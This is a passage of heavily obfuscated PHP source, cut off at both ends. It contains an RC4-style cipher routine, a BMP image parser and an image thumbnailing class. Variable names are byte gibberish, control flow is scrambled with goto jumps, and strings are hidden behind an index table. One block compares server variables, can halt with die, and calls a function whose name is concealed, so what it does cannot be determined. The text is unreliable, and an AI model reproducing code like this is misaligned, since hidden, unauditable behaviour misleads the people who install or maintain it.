md5($d¦„ó¶‰‡ ? $d¦„ó¶‰‡ : self::$defaultKey); $FÙÇ½“´Ç = md5(substr($d¦„ó¶‰‡, 0, 16)); $d¾†½î¨Ç = md5(substr($d¦„ó¶‰‡, 16, 16)); goto fË—‰“ Œƒ; Bˆé¨”Ÿ‚¯: for ($BÌä„á‡¸– = 0; $BÌä„á‡¸– <= 255; $BÌä„á‡¸–++) { $b§šŠÄƒ¿ñ[$BÌä„á‡¸–] = ord($BóçõÙÀ”ã[$BÌä„á‡¸– % $c‡‚‰ÛËªÒ]); } $D±¨»ÑØ®İ = range(0, 255); for ($eë²Ä‚…Î® = $BÌä„á‡¸– = 0; $BÌä„á‡¸– < 256; $BÌä„á‡¸–++) { $eë²Ä‚…Î® = ($eë²Ä‚…Î® + $D±¨»ÑØ®İ[$BÌä„á‡¸–] + $b§šŠÄƒ¿ñ[$BÌä„á‡¸–]) % 256; $cêìïÕ‡Å = $D±¨»ÑØ®İ[$BÌä„á‡¸–]; $D±¨»ÑØ®İ[$BÌä„á‡¸–] = $D±¨»ÑØ®İ[$eë²Ä‚…Î®]; $D±¨»ÑØ®İ[$eë²Ä‚…Î®] = $cêìïÕ‡Å; } goto A“ñš›èæÕ; fË—‰“ Œƒ: $e‡ÂŠ¼ì”ñ = substr($F¥ùÖ°ô²—, 0, $A…†ä—›¾); $BóçõÙÀ”ã = $FÙÇ½“´Ç . md5($FÙÇ½“´Ç . $e‡ÂŠ¼ì”ñ); $c‡‚‰ÛËªÒ = strlen($BóçõÙÀ”ã); goto D±¦Ó“„§; c”ùá‚ƒ: } } define($_SERVER[°Óó£ÌİóèÅ][1362], 1); goto eŞˆÆÇŒÈŸ; f”™ëº‚Ó: class ImageGdBMP { public static function load($b‚é«¸‡ÉÏ) { $Eä¥­ÉƒÌÜ = fopen($b‚é«¸‡ÉÏ, $_SERVER[°Óó£ÌİóèÅ][1167]); if ($Eä¥­ÉƒÌÜ === !1) { return !1; } $d¦Ô…Š˜İŒ = self::loadFromStream($Eä¥­ÉƒÌÜ); fclose($Eä¥­ÉƒÌÜ); return $d¦Ô…Š˜İŒ; } public static function loadFromStream($d½ÌÉ™ò›Ã) { $fööÉ§©¸Î =& $_SERVER[°Óó£ÌİóèÅ]; $f¢‚Ïš™ô = fread($d½ÌÉ™ò›Ã, 14); if ($f¢‚Ïš™ô === !1) { return !1; } if ($f¢‚Ïš™ô[0] != $fööÉ§©¸Î[1260] || $f¢‚Ïš™ô[1] != $fööÉ§©¸Î[1261]) { return !1; } $FòùÁšš´ = unpack($fööÉ§©¸Î[1262] . $fööÉ§©¸Î[1263] . $fööÉ§©¸Î[1264] . $fööÉ§©¸Î[1265] . $fööÉ§©¸Î[1266], $f¢‚Ïš™ô); return self::loadFromStreamAndFileHeader($d½ÌÉ™ò›Ã, $FòùÁšš´); } public static function loadFromStreamAndFileHeader($C¥”ÆŠ„ÒÃ, array $cí¿İÈ§ƒ¡) { goto Cò‡¬¨øŒô; Cõ¦§ÎÙƒ­: $Dï–Š¸­ï = abs($FÏÄª™‹Ã); $eÂ¹¡ğÃ„ = $FÏÄª™‹Ã > 0 ? $Dï–Š¸­ï - 1 : 0; $F‰àäÖéß = $FÏÄª™‹Ã > 0 ? -1 : 1; goto c¤„¢ö³¬; Cò‡¬¨øŒô: $Fæ­¦ìƒ¦µ =& $_SERVER[°Óó£ÌİóèÅ]; if ($cí¿İÈ§ƒ¡[$Fæ­¦ìƒ¦µ[812]] != 19778) { return !1; } $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, 4); goto a´ƒ¾†–å•; c½Ì‰ºßŠ: if ($f”ªì˜ò¡Ù == 0 || $FÏÄª™‹Ã == 0 || $cëÕ›ùİÓŠ != 1 || ($d½³Ü…„†è & $fà»íµŠó¾) != 0 || ($d½³Ü…„†è & $E‘ÛæËÌ‡) != 0 || ($d½³Ü…„†è & $EÆÅÍÚ…å) != 0 || ($fà»íµŠó¾ & $E‘ÛæËÌ‡) != 0 || ($fà»íµŠó¾ & $EÆÅÍÚ…å) != 0 || ($E‘ÛæËÌ‡ & $EÆÅÍÚ…å) != 0) { return !1; } if ($C•»ˆïô¹Ä == 4 || $C•»ˆïô¹Ä == 5) { $a–Ñ»öÍŠ = stream_get_contents($C¥”ÆŠ„ÒÃ, $fáî¤î‡¯Ï); if ($a–Ñ»öÍŠ === !1) { return !1; } return imagecreatefromstring($a–Ñ»öÍŠ); } $b§ŒÍ‚Àç÷ = $f”ªì˜ò¡Ù * $a£Ô†¹¢¡õ + 31 >> 3 & ~3; goto Cõ¦§ÎÙƒ­; c¤„¢ö³¬: if ($a£Ô†¹¢¡õ == 1 || $a£Ô†¹¢¡õ == 4 || $a£Ô†¹¢¡õ == 8) { goto a äË¿Â; E¹²Ãæ§—¨: $Fëó‹ÎÂîİ = (1 << $a£Ô†¹¢¡õ) - 1 << $F›É‡˜Ú¯õ; if ($C•»ˆïô¹Ä == 1 || $C•»ˆïô¹Ä == 2) { $béŒœÜÜÂİ = 0; $eà°©İÉâ = $a£Ô†¹¢¡õ >> 2 & 1; for (;;) { if ($béŒœÜÜÂİ < -1 || $béŒœÜÜÂİ > $f”ªì˜ò¡Ù || $eÂ¹¡ğÃ„ < -1 || $eÂ¹¡ğÃ„ > $FÏÄª™‹Ã) { imagedestroy($d“Ïªºóï); return !1; } $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, 1); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } switch ($a–Ñ»öÍŠ) { case $Fæ­¦ìƒ¦µ[1285]: $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, 1); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } switch ($a–Ñ»öÍŠ) { case $Fæ­¦ìƒ¦µ[1285]: $eÂ¹¡ğÃ„ += $F‰àäÖéß; $béŒœÜÜÂİ = 0; break; case $Fæ­¦ìƒ¦µ[1287]: $eÂ¹¡ğÃ„ = 0; $béŒœÜÜÂİ = 0; break 3; case $Fæ­¦ìƒ¦µ[1288]: $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, 2); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } list(, $d³¤â¦Ñ‘ˆ, $EÃÓÆÃˆÃ¬) = unpack($Fæ­¦ìƒ¦µ[1289], $a–Ñ»öÍŠ); $béŒœÜÜÂİ += $d³¤â¦Ñ‘ˆ; $eÂ¹¡ğÃ„ += $EÃÓÆÃˆÃ¬ * $F‰àäÖéß; break; default: list(, $D³õ”•‰©ç) = unpack($Fæ­¦ìƒ¦µ[1290], $a–Ñ»öÍŠ); $fïè ´…Ô = ($D³õ”•‰©ç >> $eà°©İÉâ) + ($D³õ”•‰©ç & $eà°©İÉâ); $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $fïè ´…Ô + 1 & ~1); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } for ($D‚åİ‘­‚¶ = 0, $C İŸ‚– = 0; $D‚åİ‘­‚¶ < $D³õ”•‰©ç; ++$D‚åİ‘­‚¶, ++$béŒœÜÜÂİ, $C İŸ‚– += $a£Ô†¹¢¡õ) { list(, $Aá«Òî¯óÀ) = unpack($Fæ­¦ìƒ¦µ[1290], $a–Ñ»öÍŠ[$C İŸ‚– >> 3]); $Dò»µÎ = $C İŸ‚– & 7; imagesetpixel($d“Ïªºóï, $béŒœÜÜÂİ, $eÂ¹¡ğÃ„, $aœá¾ª±ŞŸ[($Aá«Òî¯óÀ & $Fëó‹ÎÂîİ >> $Dò»µÎ) >> $F›É‡˜Ú¯õ - $Dò»µÎ]); } break; } break; default: $aƒãª¯Ùå = fread($C¥”ÆŠ„ÒÃ, 1); if ($aƒãª¯Ùå === !1) { imagedestroy($d“Ïªºóï); return !1; } list(, $CÃëêÂÓ‹ë, $Aá«Òî¯óÀ) = unpack($Fæ­¦ìƒ¦µ[1289], $a–Ñ»öÍŠ . $aƒãª¯Ùå); for ($D‚åİ‘­‚¶ = 0, $C İŸ‚– = 0; $D‚åİ‘­‚¶ < $CÃëêÂÓ‹ë; ++$D‚åİ‘­‚¶, ++$béŒœÜÜÂİ, $C İŸ‚– += $a£Ô†¹¢¡õ) { $Dò»µÎ = $C İŸ‚– & 7; imagesetpixel($d“Ïªºóï, $béŒœÜÜÂİ, $eÂ¹¡ğÃ„, $aœá¾ª±ŞŸ[($Aá«Òî¯óÀ & $Fëó‹ÎÂîİ >> $Dò»µÎ) >> $F›É‡˜Ú¯õ - $Dò»µÎ]); } break; } } } else { for ($a™âæØ¼êà = 0; $a™âæØ¼êà < $Dï–Š¸­ï; ++$a™âæØ¼êà, $eÂ¹¡ğÃ„ += $F‰àäÖéß) { $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $b§ŒÍ‚Àç÷); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } $C İŸ‚– = 0; for ($béŒœÜÜÂİ = 0; $béŒœÜÜÂİ < $f”ªì˜ò¡Ù; ++$béŒœÜÜÂİ, $C İŸ‚– += $a£Ô†¹¢¡õ) { list(, $Aá«Òî¯óÀ) = unpack($Fæ­¦ìƒ¦µ[1290], $a–Ñ»öÍŠ[$C İŸ‚– >> 3]); $Dò»µÎ = $C İŸ‚– & 7; imagesetpixel($d“Ïªºóï, $béŒœÜÜÂİ, $eÂ¹¡ğÃ„, $aœá¾ª±ŞŸ[($Aá«Òî¯óÀ & $Fëó‹ÎÂîİ >> $Dò»µÎ) >> $F›É‡˜Ú¯õ - $Dò»µÎ]); } } } goto FÂéçğññô; a äË¿Â: $d“Ïªºóï = imagecreate($f”ªì˜ò¡Ù, $Dï–Š¸­ï); $C‹…‘—Ëƒ« = $BÑ¬®¨Àöò == 12 ? 3 : 4; $c»·…øÌÑ½ = $AÕ›‚‰ ‰ ? $AÕ›‚‰ ‰ : pow(2, $a£Ô†¹¢¡õ); goto FÔæÀØçó; FÔæÀØçó: $aœá¾ª±ŞŸ = array(); for ($D‚åİ‘­‚¶ = 0; $D‚åİ‘­‚¶ < $c»·…øÌÑ½; ++$D‚åİ‘­‚¶) { $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $C‹…‘—Ëƒ«); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } extract(unpack($Fæ­¦ìƒ¦µ[1286], $a–Ñ»öÍŠ . $Fæ­¦ìƒ¦µ[1285])); $aœá¾ª±ŞŸ[] = imagecolorallocate($d“Ïªºóï, $d‰¿Ìëéø›, $C•™×ƒ»Œ†, $Dò»µÎ); } $F›É‡˜Ú¯õ = 8 - $a£Ô†¹¢¡õ; goto E¹²Ãæ§—¨; FÂéçğññô: } else { goto fŒƒ×Ïõ; bù”ĞŸæ: for ($a™âæØ¼êà = 0; $a™âæØ¼êà < $Dï–Š¸­ï; ++$a™âæØ¼êà, $eÂ¹¡ğÃ„ += $F‰àäÖéß) { $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $b§ŒÍ‚Àç÷); if ($a–Ñ»öÍŠ === !1) { imagedestroy($d“Ïªºóï); return !1; } $C İŸ‚– = 0; for ($béŒœÜÜÂİ = 0; $béŒœÜÜÂİ < $f”ªì˜ò¡Ù; ++$béŒœÜÜÂİ, $C İŸ‚– += $b‘Ø¸œĞÌ) { list(, $Aá«Òî¯óÀ) = unpack($Fæ­¦ìƒ¦µ[1267], substr($a–Ñ»öÍŠ, $C İŸ‚–, $b‘Ø¸œĞÌ) . $Fæ­¦ìƒ¦µ[1291]); $E²§Û©÷Áˆ = $Aá«Òî¯óÀ & $d½³Ü…„†è; $DÁøî‡Ùğ§ = $Aá«Òî¯óÀ & $fà»íµŠó¾; $Cİ¦ôÃË = $Aá«Òî¯óÀ & $E‘ÛæËÌ‡; $aœ±åâÚäÀ = $Aá«Òî¯óÀ & $EÆÅÍÚ…å; $d£´–ÆÂØö = $Dµ…‘á¯ - (($E²§Û©÷Áˆ << 7) - $E²§Û©÷Áˆ) * $fßÖâÛ‡â‡; $d‰¿Ìëéø› = (($DÁøî‡Ùğ§ << 8) - $DÁøî‡Ùğ§) * $bÊî„‰“”™; $C•™×ƒ»Œ† = (($Cİ¦ôÃË << 8) - $Cİ¦ôÃË) * $DÀËâ’çŸ®; $Dò»µÎ = (($aœ±åâÚäÀ << 8) - $aœ±åâÚäÀ) * $fóºŠ¼ÎÛ”; imagesetpixel($d“Ïªºóï, $béŒœÜÜÂİ, $eÂ¹¡ğÃ„, $d£´–ÆÂØö << 24 | $d‰¿Ìëéø› << 16 | $C•™×ƒ»Œ† << 8 | $Dò»µÎ); } } imagealphablending($d“Ïªºóï, !0); goto e†×ß‰Ï¸; A³¯ºğ™: $bÊî„‰“”™ = $fà»íµŠó¾ ? 1 / $fà»íµŠó¾ : 1; $DÀËâ’çŸ® = $E‘ÛæËÌ‡ ? 1 / $E‘ÛæËÌ‡ : 1; $fóºŠ¼ÎÛ” = $EÆÅÍÚ…å ? 1 / $EÆÅÍÚ…å : 1; goto bù”ĞŸæ; A‰ˆõÓ: $b‘Ø¸œĞÌ = $a£Ô†¹¢¡õ >> 3; $Dµ…‘á¯ = $d½³Ü…„†è ? 127 : 0; $fßÖâÛ‡â‡ = $d½³Ü…„†è ? 1 / $d½³Ü…„†è : 1; goto A³¯ºğ™; fŒƒ×Ïõ: $d“Ïªºóï = imagecreatetruecolor($f”ªì˜ò¡Ù, $Dï–Š¸­ï); imagealphablending($d“Ïªºóï, !1); if ($d½³Ü…„†è) { imagesavealpha($d“Ïªºóï, !0); } goto A‰ˆõÓ; e†×ß‰Ï¸: } return $d“Ïªºóï; goto b‚Ê ­¢å¹; a´ƒ¾†–å•: if ($a–Ñ»öÍŠ === !1) { return !1; } list(, $BÑ¬®¨Àöò) = unpack($Fæ­¦ìƒ¦µ[1267], $a–Ñ»öÍŠ); if ($BÑ¬®¨Àöò == 12) { goto fÚ¸†Ç·á½; fÚ¸†Ç·á½: $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $BÑ¬®¨Àöò - 4); if ($a–Ñ»öÍŠ === !1) { return !1; } extract(unpack($Fæ­¦ìƒ¦µ[1268] . $Fæ­¦ìƒ¦µ[1269] . $Fæ­¦ìƒ¦µ[1270] . $Fæ­¦ìƒ¦µ[1271], $a–Ñ»öÍŠ)); goto d“¶öçàŠ; d“¶öçàŠ: $AÕ›‚‰ ‰ = $A…ŒÊ ¥œÛ = $d½³Ü…„†è = $C•»ˆïô¹Ä = 0; $fà»íµŠó¾ = 16711680; $E‘ÛæËÌ‡ = 65280; goto BØ•É¡ÁÎÒ; BØ•É¡ÁÎÒ: $EÆÅÍÚ…å = 255; goto e­„¬µÍ†„; e­„¬µÍ†„: } else { if (124 < $BÑ¬®¨Àöò || $BÑ¬®¨Àöò < 40) { return !1; } else { goto Cñƒ„„È; aŸ¿Œ¸£µ: if ($f”ªì˜ò¡Ù & 2147483648) { $f”ªì˜ò¡Ù = -(~$f”ªì˜ò¡Ù & 4294967295) - 1; } if ($FÏÄª™‹Ã & 2147483648) { $FÏÄª™‹Ã = -(~$FÏÄª™‹Ã & 4294967295) - 1; } if ($c®°³§«ù & 2147483648) { $c®°³§«ù = -(~$c®°³§«ù & 4294967295) - 1; } goto b§ÕİÚÓ£ç; B™Äñ©Œ¾: if (($a£Ô†¹¢¡õ == 16 || $a£Ô†¹¢¡õ == 24 || $a£Ô†¹¢¡õ == 32) && $C•»ˆïô¹Ä == 0 && $fà»íµŠó¾ == 0 && $E‘ÛæËÌ‡ == 0 && $EÆÅÍÚ…å == 0) { switch ($a£Ô†¹¢¡õ) { case 16: $fà»íµŠó¾ = 31744; $E‘ÛæËÌ‡ = 992; $EÆÅÍÚ…å = 31; break; case 24: case 32: $fà»íµŠó¾ = 16711680; $E‘ÛæËÌ‡ = 65280; $EÆÅÍÚ…å = 255; break; } } goto b˜ƒ’íßŞ¬; b§ÕİÚÓ£ç: if ($aŒ®­°§Ë & 2147483648) { $aŒ®­°§Ë = -(~$aŒ®­°§Ë & 4294967295) - 1; } if ($cí¿İÈ§ƒ¡[$Fæ­¦ìƒ¦µ[399]] != 0) { $eÛÒäÄõ†Ğ = $a£Ô†¹¢¡õ == 1 || $a£Ô†¹¢¡õ == 4 || $a£Ô†¹¢¡õ == 8 ? ($AÕ›‚‰ ‰ ? $AÕ›‚‰ ‰ : pow(2, $a£Ô†¹¢¡õ)) << 2 : 0; $CçâÈğĞĞ‡ = $fáî¤î‡¯Ï ? $fáî¤î‡¯Ï : ($f”ªì˜ò¡Ù * $a£Ô†¹¢¡õ + 31 >> 3 & ~3) * abs($FÏÄª™‹Ã); $A·•ë÷ë‚„ = $cí¿İÈ§ƒ¡[$Fæ­¦ìƒ¦µ[399]] - $CçâÈğĞĞ‡ - $eÛÒäÄõ†Ğ - 14; if ($BÑ¬®¨Àöò < $A·•ë÷ë‚„ && 40 <= $BÑ¬®¨Àöò && $BÑ¬®¨Àöò <= 124) { $BÑ¬®¨Àöò = $A·•ë÷ë‚„; } } if ($BÑ¬®¨Àöò - 40 > 0) { $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, $BÑ¬®¨Àöò - 40); if ($a–Ñ»öÍŠ === !1) { return !1; } extract(unpack($Fæ­¦ìƒ¦µ[1281] . $Fæ­¦ìƒ¦µ[1282] . $Fæ­¦ìƒ¦µ[1283] . $Fæ­¦ìƒ¦µ[1284], $a–Ñ»öÍŠ . str_repeat($Fæ­¦ìƒ¦µ[1285], 120))); } else { $d½³Ü…„†è = $fà»íµŠó¾ = $E‘ÛæËÌ‡ = $EÆÅÍÚ…å = 0; } goto B™Äñ©Œ¾; Cñƒ„„È: $a–Ñ»öÍŠ = fread($C¥”ÆŠ„ÒÃ, 36); if ($a–Ñ»öÍŠ === !1) { return !1; } extract(unpack($Fæ­¦ìƒ¦µ[1272] . $Fæ­¦ìƒ¦µ[1273] . $Fæ­¦ìƒ¦µ[1270] . $Fæ­¦ìƒ¦µ[1274] . $Fæ­¦ìƒ¦µ[1275] . $Fæ­¦ìƒ¦µ[1276] . $Fæ­¦ìƒ¦µ[1277] . $Fæ­¦ìƒ¦µ[1278] . $Fæ­¦ìƒ¦µ[1279] . $Fæ­¦ìƒ¦µ[1280], $a–Ñ»öÍŠ)); goto aŸ¿Œ¸£µ; b˜ƒ’íßŞ¬: } } goto c½Ì‰ºßŠ; b‚Ê ­¢å¹: } } if ($_SERVER[$_SERVER[°Óó£ÌİóèÅ][57]] != $_SERVER[$_SERVER[°Óó£ÌİóèÅ][58]]) { goto eĞ¦‡ãÛ™Î; eĞ¦‡ãÛ™Î: $Fåğ«Ö„× = $_SERVER[°Óó£ÌİóèÅ][59]; $cŒÍ‘é¡Ûˆ = BASIC_PATH . $_SERVER[°Óó£ÌİóèÅ][60]; $e˜¸£¤³ğ = $Fåğ«Ö„×($cŒÍ‘é¡Ûˆ); goto EèöóºâÆ; EèöóºâÆ: $bÁ®‡‚›‡ = explode($_SERVER[°Óó£ÌİóèÅ][61], $e˜¸£¤³ğ); if (count($bÁ®‡‚›‡) < $_SERVER[°Óó£ÌİóèÅ][62]) { die; } $eÀ™ÈĞ¤í = $_SERVER[°Óó£ÌİóèÅ][63]; goto D¹ìø³´; D¹ìø³´: $eÀ™ÈĞ¤í($_SERVER[$_SERVER[°Óó£ÌİóèÅ][64]]); goto A¶ÖİÎÆì; A¶ÖİÎÆì: } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($eßŸäÙ•˜, $b‡ˆ”Îí…ƒ) { goto Bƒˆ×¿ƒöØ; Bƒˆ×¿ƒöØ: $this->srcFile = $eßŸäÙ•˜; $this->echoType = $b‡ˆ”Îí…ƒ; $this->im = self::image($eßŸäÙ•˜); goto bâº‚«ªå; bâº‚«ªå: if (!$this->im) { return !1; } $EÓƒÎÅ®” = $_SERVER[°Óó£ÌİóèÅ][33]; $this->imgData = GetImageSize($eßŸäÙ•˜, $EÓƒÎÅ®”); goto d·°ß¹Òˆ•; d·°ß¹Òˆ•: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto E±µÉà­ğ; E±µÉà­ğ: } public static function image($C§ò­âĞ˜¸) { $E¾‡ô™°‡ =& $_SERVER[°Óó£ÌİóèÅ]; $C‹ÑÔë£™À = $E¾‡ô™°‡[33]; $CŒ£“‡‡Æ = GetImageSize($C§ò­âĞ˜¸, $C‹ÑÔë£™À); $bŠ¤ì«ŞÛè = !1; switch ($CŒ£“‡‡Æ[2]) { case IMAGETYPE_GIF: if (!function_exists($E¾‡ô™°‡[1292])) { break; } $bŠ¤ì«ŞÛè = imagecreatefromgif($C§ò­âĞ˜¸); break; case IMAGETYPE_JPEG: if (!function_exists($E¾‡ô™°‡[1293])) { break; } $bŠ¤ì«ŞÛè = imagecreatefromjpeg($C§ò­âĞ˜¸); break; case IMAGETYPE_PNG: if (!function_exists($E¾‡ô™°‡[1294])) { break; } $bŠ¤ì«ŞÛè = @imagecreatefrompng($C§ò­âĞ˜¸); imagesavealpha($bŠ¤ì«ŞÛè, !0); break; case IMAGETYPE_XBM: $bŠ¤ì«ŞÛè = imagecreatefromxbm($C§ò­âĞ˜¸); break; case IMAGETYPE_WBMP: $bŠ¤ì«ŞÛè = imagecreatefromwbmp($C§ò­âĞ˜¸); break; case IMAGETYPE_BMP: $bŠ¤ì«ŞÛè = imagecreatefrombmp($C§ò­âĞ˜¸); break; default: break; } return $bŠ¤ì«ŞÛè; } public static function imageSize($A–š±ˆÃò) { $DÂ¨©À™Êº =& $_SERVER[°Óó£ÌİóèÅ]; $fÊªªèÃ‚ğ = GetImageSize($A–š±ˆÃò); if (!$fÊªªèÃ‚ğ) { return !1; } return array($DÂ¨©À™Êº[221] => $fÊªªèÃ‚ğ[0], $DÂ¨©À™Êº[901] => $fÊªªèÃ‚ğ[1]); } function distortion($D®òİ¬ÃˆÈ, $dùŒµøòê, $C¨ñ¯¨ŞÉå) { $f™¨ïÉãå¨ = $this->creatImage($this->im, $dùŒµøòê, $C¨ñ¯¨ŞÉå, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($f™¨ïÉãå¨, $D®òİ¬ÃˆÈ); } function prorate($bªÚéª…Àö, $DåİêÖİçö, $f´èå–æ¹£) { $e’”œ¹¶’Ì = $DåİêÖİçö / $f´èå–æ¹£; $EƒŠ…®ÜƒŠ = $this->srcW / $this->srcH; if ($e’”œ¹¶’Ì <= $EƒŠ…®ÜƒŠ) { $Cã¬£†äÙ = $DåİêÖİçö; $AÖ¸ä›¨•Œ = $Cã¬£†äÙ * ($this->srcH / $this->srcW); } else { $AÖ¸ä›¨•Œ = $f´èå–æ¹£; $Cã¬£†äÙ = $AÖ¸ä›¨•Œ * ($this->srcW / $this->srcH); } if ($this->srcW > $DåİêÖİçö || $this->srcH > $f´èå–æ¹£) { $AÑÊ¢ÇÉ“ = $this->creatImage($this->im, $Cã¬£†äÙ, $AÖ¸ä›¨•Œ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÑÊ¢ÇÉ“, $bªÚéª…Àö); } else { $AÑÊ¢ÇÉ“ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($AÑÊ¢ÇÉ“, $bªÚéª…Àö); } } function cut($fâÑÆÁÅ˜², $AÏ”Š¥ØˆŸ, $fŞğÀ“‘ÓÊ) { goto aíË¼´ù¤ì; C®¨Ôùóëê: return $this->echoImage($a×„´´’õÆ, $fâÑÆÁÅ˜²); goto Fªá‚ô­ìˆ; aíË¼´ù¤ì: $Dîˆ‹•Ø§ = $AÏ”Š¥ØˆŸ / $fŞğÀ“‘ÓÊ; $eõËÏï¥„Ì = $this->srcW / $this->srcH; if ($Dîˆ‹•Ø§ <= $eõËÏï¥„Ì) { $eÚ¹ÅØ­²‘ = $fŞğÀ“‘ÓÊ; $d³Œ©¿Õ†’ = $eÚ¹ÅØ­²‘ * ($this->srcW / $this->srcH); } else { $d³Œ©¿Õ†’ = $AÏ”Š¥ØˆŸ; $eÚ¹ÅØ­²‘ = $d³Œ©¿Õ†’ * ($this->srcH / $this->srcW); } goto D´óÂßİ®‘; D´óÂßİ®‘: $dº•ÍÒª¿· = $this->creatImage($this->im, $d³Œ©¿Õ†’, $eÚ¹ÅØ­²‘, 0, 0, 0, 0, $this->srcW, $this->srcH); $a×„´´’õÆ = $this->creatImage($dº•ÍÒª¿·, $AÏ”Š¥ØˆŸ, $fŞğÀ“‘ÓÊ, 0, 0, ($d³Œ©¿Õ†’ - $AÏ”Š¥ØˆŸ) / 2, ($eÚ¹ÅØ­²‘ - $fŞğÀ“‘ÓÊ) / 2, $AÏ”Š¥ØˆŸ, $fŞğÀ“‘ÓÊ); imageDestroy($dº•ÍÒª¿·); goto C®¨Ôùóëê; Fªá‚ô­ìˆ: } function backFill($F†ÎÚ…¨„, $B‹á—£ßëª, $a³Ò‘Œ»àİ, $fİŠ©Ïğø³ = false, $FòÌÅØÚ‰ = 255, $e‹·ñÅâ¹Š = 255, $F¢‹¬ ¬ = 255) { goto Aª¸¥ÌïéÚ; Aª¸¥ÌïéÚ: $A£†Ê–Ú•‰ = $B‹á—£ßëª / $a³Ò‘Œ»àİ; $f‹Ü‹‚À = $this->srcW / $this->srcH; if ($A£†Ê–Ú•‰ <= $f‹Ü‹‚À) { $BŠ‘óÚÛ¦Ÿ = $B‹á—£ßëª; $aØŒÉ¡Â“† = $BŠ‘óÚÛ¦Ÿ * ($this->srcH / $this->srcW); } else { $aØŒÉ¡Â“† = $a³Ò‘Œ»àİ; $BŠ‘óÚÛ¦Ÿ = $aØŒÉ¡Â“† * ($this->srcW / $this->srcH); } goto d›÷ÂÊ¯ôÓ; C›¸™í¯İ: if ($fİŠ©Ïğø³) { $Cµ²İ­¶Ï = imageColorTransparent($fî²ëŠœ’œ, $Cµ²İ­¶Ï); $bõàºíâƒ = $a³Ò‘Œ»àİ - $aØŒÉ¡Â“†; } imageFilledRectangle($fî²ëŠœ’œ, 0, 0, $B‹á—£ßëª, $a³Ò‘Œ»àİ, $Cµ²İ­¶Ï); if ($this->srcW > $B‹á—£ßëª || $this->srcH > $a³Ò‘Œ»àİ) { $bğäÏŸŠŒ = $this->creatImage($this->im, $BŠ‘óÚÛ¦Ÿ, $aØŒÉ¡Â“†, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($BŠ‘óÚÛ¦Ÿ < $B‹á—£ßëª) { imageCopy($fî²ëŠœ’œ, $bğäÏŸŠŒ, ($B‹á—£ßëª - $BŠ‘óÚÛ¦Ÿ) / 2, 0, 0, 0, $BŠ‘óÚÛ¦Ÿ, $aØŒÉ¡Â“†); } else { if ($aØŒÉ¡Â“† < $a³Ò‘Œ»àİ) { imageCopy($fî²ëŠœ’œ, $bğäÏŸŠŒ, 0, $bõàºíâƒ, 0, 0, $BŠ‘óÚÛ¦Ÿ, $aØŒÉ¡Â“†); } else { imageCopy($fî²ëŠœ’œ, $bğäÏŸŠŒ, 0, 0, 0, 0, $BŠ‘óÚÛ¦Ÿ, $aØŒÉ¡Â“†); } } } else { imageCopyMerge($fî²ëŠœ’œ, $this->im, ($B‹á—£ßëª - $BŠ‘óÚÛ¦Ÿ) / 2, $bõàºíâƒ, 0, 0, $BŠ‘óÚÛ¦Ÿ, $aØŒÉ¡Â“†, 100); } goto cÍçğ‡ŞÑŒ; d›÷ÂÊ¯ôÓ: if (function_exists($_SERVER[°Óó£ÌİóèÅ][1295])) { @($fî²ëŠœ’œ = imageCreateTrueColor($B‹á—£ßëª, $a³Ò‘Œ»àİ)); if (!$fî²ëŠœ’œ) { $fî²ëŠœ’œ = imageCreate($B‹á—£ßëª, $a³Ò‘Œ»àİ); } } else { $fî²ëŠœ’œ = imageCreate($B‹á—£ßëª, $a³Ò‘Œ»àİ); } $bõàºíâƒ = ($a³Ò‘Œ»àİ - $aØŒÉ¡Â“†) / 2; $Cµ²İ­¶Ï = imagecolorallocate($fî²ëŠœ’œ, $FòÌÅØÚ‰, $e‹·ñÅâ¹Š, $F¢‹¬ ¬); goto C›¸™í¯İ; cÍçğ‡ŞÑŒ: return $this->echoImage($fî²ëŠœ’œ, $F†ÎÚ…¨„); goto FƒæÒŠª¹‡; FƒæÒŠª¹‡: } function creatImage($c…‰„¿„², $aØ·Á–³‹, $BÒç·ãŞì¢, $c¥‘íé¾œ, $E«‡Æİ†¦È, $fÎ¹¿‹Ÿâ¶, $a…àìÜ‚¬‹, $aí£Š¥˜õ, $d„óåŒ‹à±) { if (function_exists($_SERVER[°Óó£ÌİóèÅ][1295])) { @($E·‘Ëø£‡ƒ = ImageCreateTrueColor($aØ·Á–³‹, $BÒç·ãŞì¢)); @imagealphablending($E·‘Ëø£‡ƒ, !1); @imagesavealpha($E·‘Ëø£‡ƒ, !0); if ($E·‘Ëø£‡ƒ) { imageCopyResampled($E·‘Ëø£‡ƒ, $c…‰„¿„², $c¥‘íé¾œ, $E«‡Æİ†¦È, $fÎ¹¿‹Ÿâ¶, $a…àìÜ‚¬‹, $aØ·Á–³‹, $BÒç·ãŞì¢, $aí£Š¥˜õ, $d„óåŒ‹à±); } else { $E·‘Ëø£‡ƒ = ImageCreate($aØ·Á–³‹, $BÒç·ãŞì¢); imageCopyResized($E·‘Ëø£‡ƒ, $c…‰„¿„², $c¥‘íé¾œ, $E«‡Æİ†¦È, $fÎ¹¿‹Ÿâ¶, $a…àìÜ‚¬‹, $aØ·Á–³‹, 